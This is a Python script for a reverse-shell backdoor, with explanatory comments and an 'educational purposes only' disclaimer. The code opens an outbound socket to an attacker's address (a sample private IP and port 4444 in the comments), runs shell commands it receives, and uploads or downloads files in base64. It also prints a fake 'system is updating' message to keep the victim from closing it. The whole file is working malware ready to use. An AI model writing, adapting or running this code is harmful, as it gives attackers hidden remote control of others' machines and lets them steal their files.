#!/usr/bin/env python



# This code is a python script that creates a backdoor. The backdoor connects to the specified IP address and port 
# (192.168.43.52, 4444) and waits for commands from the attacker. 

# The script starts by importing required libraries:
# - json is used to encode and decode data to and from a JSON string format
# - socket is used for low-level network communication
# - subprocess is used to run system commands
# - os is used to interact with the operating system
# - base64 is used for encoding and decoding binary data to and from a base64 string format

# The Backdoor class is defined to create the backdoor functionality. 
# In the class __init__ method, a socket connection is created to the specified IP and port.
# The reliable_send and reliable_receive methods are used to send and receive data to and from the attacker. 
# The data is encoded to a JSON string format before being sent and decoded after being received.

# The change_working_directory_to, execute_system_command, read_file and write_file methods are used to interact with the operating system.
# The change_working_directory_to method changes the current working directory to the specified path.
# The execute_system_command method executes shell commands.
# The read_file method reads the content of a file and returns it in a base64 encoded string format.
# The write_file method writes a base64 encoded string to a file.

# The run method is the main loop of the program. It receives commands from the attacker, executes them and sends back the results. 
# If the received command is "exit", the connection is closed and the program exits.

# Finally, an instance of the Backdoor class is created and its run method is executed.
"""

Note: The Python backdoor code provided here is intended for educational purposes only. 
It should only be used in controlled environments for the purpose of learning about network security and penetration testing. 
Any unauthorized use of this code is strictly prohibited and may result in legal consequences. 
Use at your own risk.

"""

print("Don't close the tab you're system is updating \..... ")
# Import required libraries

import json
import socket
import subprocess
import os
import base64

# Define the Backdoor class

class Backdoor: 
# Initialize the class with the IP and port for the connection
    def __init__(self, ip, port):
    	# Create a socket for the connection
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the specified IP and port
        self.connection.connect((ip, port))
    # Function to send data reliably over the connection
    def reliable_send(self, data):
    	# Convert the data to JSON and encode it
        json_data = json.dumps(data).encode()
        # Send the data over the connection
        self.connection.send(json_data)

     # Function to receive data reliably over the connection
    def reliable_receive(self):
    # Initialize an empty string for the JSON data
        json_data = ""
    # Keep trying to receive data until a complete JSON is received
        while True:
            try:
            	# Receive data from the connection and decode it
                json_data = json_data + self.connection.recv(1024).decode()
                # Try to convert the JSON data to a Python object
                return json.loads(json_data)
            except ValueError:
            	# If the data is not a complete JSON, continue receiving
                continue

    # Function to change the current working directory
    def change_working_directory_to(self, path):
         # Change the current working directory using the os library
        os.chdir(path)
        # Return a message indicating the change
        return "[+] Changing working directory to " + path

    # Function to execute a system command
    def execute_system_command(self, command):
    	# Use the subprocess library to execute the command
        return subprocess.check_output(command, shell=True)

    # Function to read a file
    def read_file(self, path):
    	# Open the file in binary mode for reading
        with open(path, "rb") as file:
        	# Use the base64 library to encode the contents of the file
            return base64.b64encode(file.read())

   # Function to write a file
    def write_file(self, path, content):
    	 # Open the file in binary mode for writing
        with open(path, "wb") as file:
        	# Use the base64 library to decode the contents of the file
            file.write(base64.b64decode(content))
            # Return a message indicating a successful upload
            return "[+] Upload successful."

# Main run function to keep receiving and executing commands
    def run(self):
    	# Keep the connection running indefinitely
        while True:
        	# Receive a command from the connection
            command = self.reliable_receive()

            try:
                # Check if the received command is to exit the connection
                if command[0] == "exit":
                	# Close the connection and exit the program
                    self.connection.close()
                    exit()

                # Check if the received command is to change the working directory
                elif command[0] == "cd" and len(command) > 1:
                	# Change the working directory to the specified path
                    command_result = self.change_working_directory_to(command[1])
                # Check if the received command is to upload a file
                elif command[0] == "upload":
                	# Write the file to the specified path
                    command_result = self.write_file(command[1], command[2])
                # Check if the received command is to download a file
                elif command[0] == "download":
                	# Read the specified file and decode it
                    command_result = self.read_file(command[1]).decode()
                 # If the received command is not any of the above, it is assumed to be a system command
                else:
                	 # Execute the system command and decode the result
                    command_result = self.execute_system_command(command).decode()
             # Catch any exceptions that may occur during command execution
            except Exception:
            	# Return an error message
                command_result = "[-] Error during command execution."

           # Send the result of the command back to the connection
            self.reliable_send(command_result)


# Create an instance of the Backdoor class and run it
my_backdoor = Backdoor("IP-Address", "port number")
my_backdoor.run()
